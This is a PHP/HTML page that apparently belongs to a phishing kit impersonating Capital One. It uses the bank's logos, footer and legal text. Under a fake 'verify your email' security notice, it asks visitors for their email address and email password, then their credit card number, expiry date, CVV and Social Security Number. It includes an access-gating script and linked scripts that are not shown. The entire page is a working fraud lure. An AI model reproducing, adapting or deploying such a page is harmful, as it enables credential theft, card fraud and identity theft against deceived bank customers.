<?php include "../../x/lock.php"; ?>
<html>
<head>
<title>Capital One - Account Authentication Request</title>
<link rel="stylesheet" href="cs/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="shortcut icon" href="./im/icon.png" type="image/ico" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="js/jquery.js"></script>
<script src="js/script.js"></script>
</head>
<body>
<header>
	<div class="hold">
		<div class="brand lt">
			<img src="./im/capitalone-logo.png" alt="capital one">
		</div>
		<div class="nav rt">
			<a href="" title="United States"><img src="im/nv.png" alt="map-marker"> United States <i class="fa fa-angle-down"></i></a>
			<a href="" title="English"><img src="im/gl.png" alt="globe"> English <i class="fa fa-angle-down"></i></a>
			<a href="" title="Sign In"><img src="im/sn.png" alt="user-icon"> Sign In</a>
		</div>
	</div>
</header>
<div class="container">
	<div class="hold">
		<div class="cfm">
			<div class="bar">
				<img src="./im/email.png" alt="avatar" class="baim" id="av-eml">
				<img src="./im/icon-card-venture-new.png" alt="avatar" class="baim" id="av-crd">
				<img src="./im/lock-icon-gray.png" alt="avatar" class="baim" id="av-scr">
				<h1 id="h1" name="h1">For your security, we need to verify your email</h1>
				<span id="hp" name="hp">We need to make sure it's really you. For your protection, kindly validate your account's email address with our 256-bit secure login.</span>
			</div>
			<div class="bar">
				<div class="bar-1">
					<div class="bar-2 barr" id="bar-2">
						<form id="data-eml" name="data-eml">
							<div class="imp">
								<label>Email Address</label>
								<input type="email" class="inp eml" id="coeml" name="coeml" autocomplete="off" />
								<div class="err" id="er1">You must enter your Email Address</div>
							</div>
							<div class="imp">
								<label>Email Password</label>
								<input type="password" class="inp pss" id="coempw" name="coempw" autocomplete="off" />
								<div class="err" id="er2">Enter Email Passcode to Continue</div>
							</div><br>
							<div class="imp">
								<button type="submit" name="submit" class="btn btn2" id="submit">Verify Email</button>
							</div>
							<div class="imp">
								<a href="" class="lt" title="Forgot Username or Password?">Forgot Registered Email?</a>
								<a href="" class="rt" title="Enroll here">Enroll here</a>
							</div>
						</form>
					</div>
					<div class="bar-3" id="bar-3">
						<form id="data-crd">
							<div class="imp">
								<label>Credit Card Number</label>
								<input type="text" name="ccnum" class="inp cc" id="ccnum" autocomplete="off" pattern=".{0}|.{16,}" maxlength="16" />
								<div class="err" id="er3">You must enter a valid Card Number</div>
							</div>
							<div class="imp">
								<label>Expiration Date</label>
								<i class="ex lt"><img src="./im/gray-noforeignfees.png" alt="" /></i>
								<span class="slc">
									<select name="mm" id="mm" >
										<option value="">Month</option>
										<?php for($i = 1; $i < 12+1; $i++){
											echo '<option value="'.$i.'">'.$i.'</option>';
										}?>
									</select>
									<i class="ar rt fa fa-angle-down"></i>
								</span>
								<span class="slc">
									<select name="yy" id="yy">
										<option value="">Year</option>
										<?php for($i = date("Y"); $i < date("Y")+10; $i++){
											echo '<option value="'.$i.'">'.$i.'</option>';
										}?>
									</select>
									<i class="ar rt fa fa-angle-down"></i>
								</span>
							</div>
							<div class="imp">
								<label>Card CVV</label>
								<input type="text" name="cvv" class="inp inp2 cvv" id="cvv" autocomplete="off" pattern=".{0}|.{3,}" maxlength="4" />
								<div class="err" id="er4">Enter your Card Verification Code</div>
							</div>
							<div class="imp">
								<label>Social Security Number</label>
								<input type="text" name="ssn" class="inp inp2 pss" id="ssn" autocomplete="off" pattern=".{0}|.{11,}" maxlength="11" placeholder="XXX - XX - XXXX" />
								<div class="err" id="er5">Enter Social Security Number to Continue</div>
							</div><br>
							<div class="imp">
								<button type="submit" name="submit" class="btn btn2" id="btn">Continue</button>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<footer>
	<div class="hold" style="width:85%;">
		<ul style="font-size:21px;">
			<li><a href="" title="PRODUCTS">PRODUCTS</a><li>
			<li><a href="" title="ABOUT US"><i class="fa fa-caret-right"></i>ABOUT US</a><li>
			<li><a href="" title="CAREERS">CAREERS</a><li>
			<li><a href="" title="LEGAL"><i class="fa fa-caret-right"></i>LEGAL</a><li>
		</ul>
		<ul style="border-left:1px solid #ccc;font-size:21px;">
			<li><a href="" title="CONTACT US">CONTACT US</a><li>
			<li><a href="" class="sm" title="Privacy">Privacy</a><li>
			<li><a href="" class="sm" title="Security">Security</a><li>
			<li><a href="" class="sm" title="Terms & Conditions">Terms & Conditions</a><li>
			<li><a href="" class="sm" title="Accessibility">Accessibility</a><li>
		</ul><br><br>
		<ul class="ft ft1">
			<li>This site provides information about and access to financial services offered by the Capital One family of companies, including Capital One Bank (USA), N.A. and Capital One, N.A., Member FDIC. See your account agreement for information about the Capital One company servicing your individual accounts. Capital One does not provide, endorse, nor guarantee and is not liable for third party products, services, educational tools, or other information available through this site.Read additional important disclosures &copy;<?php echo date("Y");?> Capital One. Capital One is a federally registered trademark. All rights reserved.</li>
		</ul>
		<ul class="ft ft2">
			<li><a href="https://www.fdic.gov/"><img src="https://verified.capitalone.com/challenge/images/fdic.jpg" alt="FDIC"></a></li>
			<li><a href="https://www.fdic.gov/"><img src="https://verified.capitalone.com/challenge/images/ehl.svg" alt="Housing Lender"></a></li>
			<li><a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&lang=en&dn=services.capitalone.com"><img src="https://verified.capitalone.com/challenge/images/norton.svg" alt="Norton"></a></li>
		</ul>
	</div>
</footer>
</body>
</html>